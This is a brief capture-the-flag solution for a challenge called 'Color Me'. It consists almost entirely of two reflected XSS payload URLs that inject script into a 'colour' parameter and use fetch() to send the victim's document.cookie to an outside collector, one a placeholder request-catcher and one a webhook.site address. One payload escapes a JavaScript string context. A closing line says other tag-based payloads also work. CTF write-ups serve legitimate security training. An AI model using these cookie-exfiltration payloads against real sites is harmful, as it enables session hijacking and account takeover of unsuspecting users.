# Color Me

Exploit: Reflected XSS

```
https://colorme.ctf.maplebacon.org/?colour=<script>fetch('requestcatcherURLhere?c='%2B(document.cookie))</script>
```

Second intended solution:
```
https://colorme.ctf.maplebacon.org/?colour=%22;%20fetch(%27https://webhook.site/62fdd4d7-646c-4052-af6f-7ff7c4f5c025?c=%27%2B(document.cookie));const%20ignore%20=%20%22
```

NOTE: You can use all sorts of different XSS payloads - `img` tags, `iframes`, etc etc.